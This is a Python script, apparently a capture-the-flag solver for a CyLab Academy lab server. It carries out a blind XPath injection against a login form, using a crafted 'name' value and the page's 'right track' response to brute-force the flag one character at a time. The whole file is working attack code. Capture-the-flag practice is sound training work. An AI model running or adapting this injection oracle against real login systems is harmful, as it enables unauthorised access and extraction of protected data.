import sys, requests, urllib3, re, string, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
PWD = "asdf"


def check(prefix):
    inj = "' or //*[contains(.,\"%s\")] or 'x'='" % prefix
    try:
        r = requests.post(BASE, data={"name": inj, "pass": PWD}, timeout=20)
    except Exception as e:
        return False, "ERR " + type(e).__name__
    return ("right track" in r.text), len(r.text)


ok, info = check("academy{")
print("test 'academy{' ->", ok, info)
if not ok:
    for cand in ("academy", "acade", "a", "flag", "picoCTF", "{"):
        o, i = check(cand)
        print("  test %r ->" % cand, o, i)
if ok:
    flag = "academy{"
    options = string.ascii_lowercase + string.digits + "_}" + string.ascii_uppercase + "-!@#"
    while not flag.endswith("}") and len(flag) < 80:
        found = False
        for ch in options:
            o, _ = check(flag + ch)
            if o:
                flag += ch
                print("  -> %r" % flag, flush=True)
                found = True
                break
        if not found:
            print("aucun caractere trouve apres %r" % flag)
            break
    print("\nFLAG:", flag)
